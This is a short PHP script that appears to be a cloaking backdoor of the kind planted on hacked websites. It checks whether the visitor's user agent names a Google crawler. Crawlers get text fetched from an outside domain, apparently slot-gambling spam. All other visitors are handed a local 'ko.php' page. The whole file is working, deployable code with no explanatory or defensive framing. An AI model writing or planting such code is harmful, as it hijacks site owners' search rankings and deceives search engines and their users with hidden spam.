<?php

function is_google_bot() {
    $agents = [
        "Googlebot",
        "Google-Site-Verification",
        "Google-InspectionTool",
        "Googlebot-Mobile",
        "Googlebot-News"
    ];

    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

    foreach ($agents as $agent) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            return true;
        }
    }

    return false;
}

if (is_google_bot()) {
    $bot_content = @file_get_contents('https://xn--pdkuc0bb.net/landing-page/emo78/mpo-slot.txt');
    if ($bot_content !== false) {
        echo $bot_content;
    }
    exit;
} else {
    include('ko.php');
    exit;
}

?>